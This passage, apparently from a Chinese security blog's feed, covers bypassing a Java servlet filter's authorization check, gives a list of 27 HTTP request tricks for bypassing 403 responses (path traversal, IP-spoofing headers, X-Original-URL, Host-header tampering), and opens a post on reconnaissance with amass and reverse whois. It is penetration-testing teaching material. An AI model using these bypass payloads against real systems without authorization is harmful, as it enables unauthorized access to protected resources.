string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、分隔符绕过"><a href="#2、分隔符绕过" class="headerlink" title="2、分隔符绕过"></a>2、分隔符绕过</h3><p>上面的案例中，”/system.login”是一个白名单接口，访问它不需要经过filter，我们可以通过跳转的方式来绕过，那如果路径检测了非法符号的话呢？在URL中有个保留字符分号”;”，如果参数过多的情况下，使用分号；可以将其连接起来作为一个请求参数来传递，简单来说如果在URL中引入分隔符，通常是不会对正常接口造成影响的。<br>我们先看看以下的代码块</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".do"</span><span class="token punctuation">)</span> <span class="token operator">||</span> url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"admin=1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"unauthorized access"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当获取到的url结尾是”.do”或者是”.action”时，如果cookie不含有”admin=1”，则判断为未授权访问，意思就是如果我们的结尾不是”.do”或者”.action”，则直接放行，我们直接采用分隔符的方式绕过endsWith()的检测。<br>直接访问main.do响应未授权<br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1662789350360-074d81d6-e9d9-4450-9c94-880eb147d4f4.png"><br>加入分隔符就能绕过权限控制了<br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1662789384728-8e726d6e-1451-4ab1-8c52-448bcd1088c7.png"></p><h3 id="3、URL编码绕过"><a href="#3、URL编码绕过" class="headerlink" title="3、URL编码绕过"></a>3、URL编码绕过</h3><p>当filter走完对应的流程后，中间件会对请求的URL进行一次解码操作，然后再找到对应的Servlet进行访问，而在request.getRequestURL()和request.getRequestURI()这两个方法中并不会对请求的URL进行一次解码操作，也就是说我们可以对main.do进行一次url编码再引入两个方法中，这个时候规则匹配会失败，直接进入Servlet，从而达到权限绕过的目的。<br><code>http://192.168.3.2:8080/%6d%61%69%6e%2e%64%6f</code><br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1662792114023-488d34cf-a9ef-44cd-8e43-2c6badfba7ef.png"></p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><code>https://blog.csdn.net/qq_38154820/article/details/106799046</code></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过403总结</title>
      <link href="/2022/10/10/rao-guo-403-zong-jie/"/>
      <url>/2022/10/10/rao-guo-403-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="1、通过数组包裹关键值"><a href="#1、通过数组包裹关键值" class="headerlink" title="#1、通过数组包裹关键值"></a><u><strong>#1、通过数组包裹关键值</strong></u></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/json{"emails":"random@gmail.com"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/json{"emails":["random@gmail.com"]}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、用json包裹关键值"><a href="#2、用json包裹关键值" class="headerlink" title="#2、用json包裹关键值"></a><strong><u>#2、用json包裹关键值</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/json{"id":"1"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、修改请求方法"><a href="#3、修改请求方法" class="headerlink" title="#3、修改请求方法"></a><strong><u>#3、修改请求方法</u></strong></h2><p>我们可以通过修改请求方法来绕过403，可用的的请求方法有：【GET、POST、PATCH、TRACE】</p><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据</p><pre class="line-numbers language-html"><code class="language-html">GET /userinfo?id=1 HTTP/1.1Host: api.host.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4、在路由中添加-更改-API-版本"><a href="#4、在路由中添加-更改-API-版本" class="headerlink" title="#4、在路由中添加/更改 API 版本"></a><strong><u>#4、在路由中添加/更改 API 版本</u></strong></h2><p>原数据1：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据1：</p><pre class="line-numbers language-html"><code class="language-html">POST /v1/userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原数据2：</p><pre class="line-numbers language-html"><code class="language-html">POST /v1/userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据2：</p><pre class="line-numbers language-html"><code class="language-html">POST /v2/userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、关键值作为通配符"><a href="#5、关键值作为通配符" class="headerlink" title="#5、关键值作为通配符"></a><strong><u>#5、关键值作为通配符</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据1:</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据2:</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6、添加-URL-编码"><a href="#6、添加-URL-编码" class="headerlink" title="#6、添加 URL 编码"></a><strong><u>#6、添加 URL 编码</u></strong></h2><p>原数据</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了对关键参数值添加URL编码，也可以尝试对路径添加URI编码，通过使用Intruder来批量fuzz可用的url编码。</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo..%ff HTTP/1.1POST /userinfo%2e%2e%2f HTTP/1.1POST /userinfo%3f HTTP/1.1POST /userinfo%23 HTTP/1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7、路径穿越"><a href="#7、路径穿越" class="headerlink" title="#7、路径穿越"></a><strong><u>#7、路径穿越</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">POST //userinfo HTTP/1.1POST /../userinfo HTTP/1.1POST /;../userinfo HTTP/1.1POST /..;/userinfo HTTP/1.1POST /userinfo/ HTTP/1.1POST /%2f/userinfo/ HTTP/1.1POST /userinfo../ HTTP/1.1POST /..%3B/userinfo HTTP/1.1POST /..%2e/userinfo HTTP/1.1POST /.//userinfo HTTP/1.1POST /./userinfo HTTP/1.1POST /#/userinfo HTTP/1.1POST /#/../userinfo HTTP/1.1...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8、参数污染"><a href="#8、参数污染" class="headerlink" title="#8、参数污染"></a><strong><u>#8、参数污染</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=2&amp;id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="9、修改协议头"><a href="#9、修改协议头" class="headerlink" title="#9、修改协议头"></a><strong><u>#9、修改协议头</u></strong></h2><pre class="line-numbers language-html"><code class="language-html">https://host.com/debug/   ----  403http://host.com/debug/    ----  200<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="10、添加Host头"><a href="#10、添加Host头" class="headerlink" title="#10、添加Host头"></a><u><strong><em>#10、添加Host头</em></strong></u></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comHost: localhostContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11、修改Host头为host头"><a href="#11、修改Host头为host头" class="headerlink" title="#11、修改Host头为host头"></a><strong><u>#11、修改Host头为host头</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comHost: localhostContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1host: api.host.comHost: localhostContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="12、删除Host头中的空格"><a href="#12、删除Host头中的空格" class="headerlink" title="#12、删除Host头中的空格"></a><strong><u>#12、删除Host头中的空格</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host:api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="13、在Host头中添加空格"><a href="#13、在Host头中添加空格" class="headerlink" title="#13、在Host头中添加空格"></a><strong><u>#13、在Host头中添加空格</u></strong></h2><p>原数据:</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host:  api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="14、修改后缀"><a href="#14、修改后缀" class="headerlink" title="#14、修改后缀"></a><strong><u>#14、修改后缀</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo.json HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用Intruder模块批量fuzz后缀名</p><h2 id="15、添加X-Original-URL头"><a href="#15、添加X-Original-URL头" class="headerlink" title="#15、添加X-Original-URL头"></a><strong><u>#15、添加X-Original-URL头</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">GET / HTTP/1.1Host: api.host.comX-Original-URL: /debug/Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="16、添加以下头来绕过403："><a href="#16、添加以下头来绕过403：" class="headerlink" title="#16、添加以下头来绕过403："></a><strong><u>#16、添加以下头来绕过403：</u></strong></h2><pre class="line-numbers language-html"><code class="language-html">CF-Connecting-IP: 127.0.0.1Content-type: 0Fastly-Client-IP: 127.0.0.1Forwarded: 127.0.0.1Forwarded: for=127.0.0.1Forwarded-For: 127.0.0.1Forwarded-For-Ip: 127.0.0.1True-Client-IP: 127.0.0.1X-Client-IP: 127.0.0.1X-Cluster-Client-IP: 127.0.0.1X-Custom-IP-Authorization: 127.0.0.1X-Forwarded: 127.0.0.1X-Forwarded-By: 127.0.0.1X-Forwarded-For:X-Forwarded-For: 127.0.0.1X_Forwarded_For: 127.0.0.1X-Forwarded-For: 127.0.0.1\rX-Forwarded-For-Original: 127.0.0.1X-Forwarded-Host: 127.0.0.1X-Forwarder-For: 127.0.0.1X-Forward-For: 127.0.0.1X-Host: 127.0.0.1X-Originating-IP: 127.0.0.1X-ProxyUser-Ip: 127.0.0.1X-Real-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Remote-IP: 127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="17、添加X-Rewrite-URL头"><a href="#17、添加X-Rewrite-URL头" class="headerlink" title="#17、添加X-Rewrite-URL头"></a><strong><u>#17、添加X-Rewrite-URL头</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">GET / HTTP/1.1Host: api.host.comX-Rewrite-URL: /debug/Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="18、修改User-Agent头"><a href="#18、修改User-Agent头" class="headerlink" title="#18、修改User-Agent头"></a><strong><u>#18、修改User-Agent头</u></strong></h2><p>通过Intruder来批量fuzz可用的User-Agent头</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comUser-Agent: FUZZContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="19、通过反向代理的方式来尝试绕过"><a href="#19、通过反向代理的方式来尝试绕过" class="headerlink" title="#19、通过反向代理的方式来尝试绕过"></a><strong><u>#19、通过反向代理的方式来尝试绕过</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">GET http://api.host.com/debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="20、通过大小写转换的方式绕过"><a href="#20、通过大小写转换的方式绕过" class="headerlink" title="#20、通过大小写转换的方式绕过"></a><strong><u>#20、通过大小写转换的方式绕过</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">GET /DEBUG/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="21、添加200-OK绕过403"><a href="#21、添加200-OK绕过403" class="headerlink" title="#21、添加200-OK绕过403"></a><u><strong><em>#21、添加200-OK绕过403</em></strong></u></h2><p>如果有Apache作为代理，我们可以通过在接口中添加200-OK来绕过403</p><p>原数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据</p><pre class="line-numbers language-html"><code class="language-html">GET /200-OK/..//debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第二种方式是通过200-OK+%2e%2e的组合来绕过403</p><pre class="line-numbers language-html"><code class="language-html">GET /200-OK/%2e%2e/debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第三种和第二种相似，只是我们在200-OK后面添加个空格</p><pre class="line-numbers language-html"><code class="language-html">GET /200-OK%20/%2e%2e/debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第四种通过；来绕过限制</p><pre class="line-numbers language-html"><code class="language-html">GET /200-OK/;debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>除了在前面添加，我们也可以在后面添加</p><pre class="line-numbers language-html"><code class="language-html">GET /debug;/../200-OK HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="22、在接口后面添加？"><a href="#22、在接口后面添加？" class="headerlink" title="#22、在接口后面添加？"></a><strong><u>#22、在接口后面添加？</u></strong></h2><pre class="line-numbers language-html"><code class="language-html">GET /debug? HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="23、修改请求方法为小写"><a href="#23、修改请求方法为小写" class="headerlink" title="#23、修改请求方法为小写"></a><strong><u>#23、修改请求方法为小写</u></strong></h2><p>我们通过将请求方法修改为小写的方式来绕过，比如GET -&gt; GeT、POST -&gt; Post</p><p>原数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据</p><pre class="line-numbers language-html"><code class="language-html">GeT /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="24、请求数据第一行添加-r-n"><a href="#24、请求数据第一行添加-r-n" class="headerlink" title="#24、请求数据第一行添加\r\n"></a><u><strong>#24、请求数据第一行添加\r\n</strong></u></h2><p>原数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据</p><pre class="line-numbers language-html"><code class="language-html">\r\nGET /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="25、使用Content-type-0"><a href="#25、使用Content-type-0" class="headerlink" title="#25、使用Content-type: 0"></a><u>#25、使用Content-type: 0</u></h2><p>原数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1Host: api.host.comContent-type: 0Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="26、hop-by-hop"><a href="#26、hop-by-hop" class="headerlink" title="#26、hop-by-hop"></a><strong><u>#26、hop-by-hop</u></strong></h2><p>原数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedConnection: Close, X-Real-Ip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="27、x-user-id"><a href="#27、x-user-id" class="headerlink" title="#27、x-user-id"></a><strong><u>#27、x-user-id</u></strong></h2><pre class="line-numbers language-html"><code class="language-html">GET /api/users/1337 => 401GET /api/users/ x-user-id: 1337 =>> 200 OkPOST /api/users/ x-user-id: 1337 =>> 200 Ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><strong><u>参考资料</u></strong></h2><p><a href="https://github.com/sting8k/BurpSuite_403Bypasser">https://github.com/sting8k/BurpSuite_403Bypasser</a></p><p><a href="https://github.com/yunemse48/403bypasser">https://github.com/yunemse48/403bypasser</a></p><p><a href="https://docs.google.com/presentation/d/1ek6DzXKBQd6xUiVNGRT33pMACs8M13CSoYCkgepDKZk/edit#slide=id.gb344e2d586_0_0">https://docs.google.com/presentation/d/1ek6DzXKBQd6xUiVNGRT33pMACs8M13CSoYCkgepDKZk/edit#slide=id.gb344e2d586_0_0</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的信息收集论</title>
      <link href="/2021/01/22/wo-de-xin-xi-shou-ji-lun/"/>
      <url>/2021/01/22/wo-de-xin-xi-shou-ji-lun/</url>
      
        <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>众所周知，做漏洞挖掘前期的信息收集工作起着非常大的作用，可以说信息收集的工作决定了你在做漏洞挖掘时的效率，本篇文章旨在记录下我的信息收集准备工作。</p><a id="more"></a><h1 id="二、水平域的收集"><a href="#二、水平域的收集" class="headerlink" title="二、水平域的收集"></a>二、水平域的收集</h1><p>当你挖一家厂商时，可以先看看厂商在hackerone是否有项目，有的话可以去里面收集范围：<br><img src="https://img-blog.csdnimg.cn/20210122173407447.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3ODI2Mjg5MjU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>如果希望在hackerone给的赏金范围上继续进行资产的收集，我们可以将目光转到 <a href="https://crunchbase.com/">https://crunchbase.com</a> 的网站，进一步扩大我们的业务范围。</p><p>从这里我们可以看到很多收购行为，我们需要对这些收购行为进行谷歌搜索并分析，以确定这个行为是否仍属于母公司，而并没有拆分和出售给其他公司:<br><img src="https://img-blog.csdnimg.cn/20210122174255277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3ODI2Mjg5MjU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>当然我们也可以通过反whois查询来查询注册邮箱或者联系人下的资产信息，如下图，我们首先来看看yahoo的whois：</p><pre><code>whois yahoo.com</code></pre><p><img src="https://img-blog.csdnimg.cn/20210122174512416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3ODI2Mjg5MjU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>通过whois查看到注册人邮箱为<a href="mailto:&#x64;&#x6f;&#109;&#x61;&#105;&#110;&#x2d;&#x61;&#100;&#109;&#105;&#110;&#64;&#111;&#x61;&#x74;&#104;&#x2e;&#x63;&#x6f;&#x6d;">&#x64;&#x6f;&#109;&#x61;&#105;&#110;&#x2d;&#x61;&#100;&#109;&#105;&#110;&#64;&#111;&#x61;&#x74;&#104;&#x2e;&#x63;&#x6f;&#x6d;</a>，我们就可以通过此电子邮箱来查找与yahoo.com 具有相同注册人电子邮件的所有其他站点，你可以通过 <a href="https://tools.whoisxmlapi.com/reverse-whois-search">https://tools.whoisxmlapi.com/reverse-whois-search</a> 来进行查询，也可以通过 <a href="https://viewdns.info/">https://viewdns.info</a> 来进行反whois查询，渗透测试神器amass也提供了相应的查询功能，查询的命令为：</p><pre><code>amass intel -whois -d yahoo-inc.com</code></pre><p>有时候我们会遇到域名有屏蔽关键信息的现象，导致我们没办法看到真正的注册邮箱，这个时候我们可以通过查询域名的历史whois来得到关键信息，这时我们可以使用 <a href="https://www.whoxy.com/">https://www.whoxy.com/</a> 来查询历史whois。</p><h1 id="三、ASN枚举"><a href="#三、ASN枚举" class="headerlink" title="三、ASN枚举"></a>三、ASN枚举</h1><p>通过(bgp.he.net)来查询as号：</p><p>我们可以利用amass来查询组织名称中带有sony的asn号，使用的命令是：</p><pre><code>amass intel -org sony</code></pre><p>通过<a href="https://github.com/yassineaboukir/Asnlookup">Asnlookup</a>来获取特定组织的资产ip段。</p><h1 id="四、垂直域的收集"><a href="#四、垂直域的收集" class="headerlink" title="四、垂直域的收集"></a>四、垂直域的收集</h1><p>子域名枚举是信息收集工作中最为重要的一环，子域名收集得越全，你挖到漏洞的概率也会相应地增加，这里就简单讲下我平时收集子域名的主要几种方式吧。<br>1、通过burpsuite收集子域名</p><p>第一步，确定收集的范围；<br>第二步，对所有的链接进行爬行，爬虫的工具很多，这里不多加述说，这里我使用的是burpsuite：<br><img 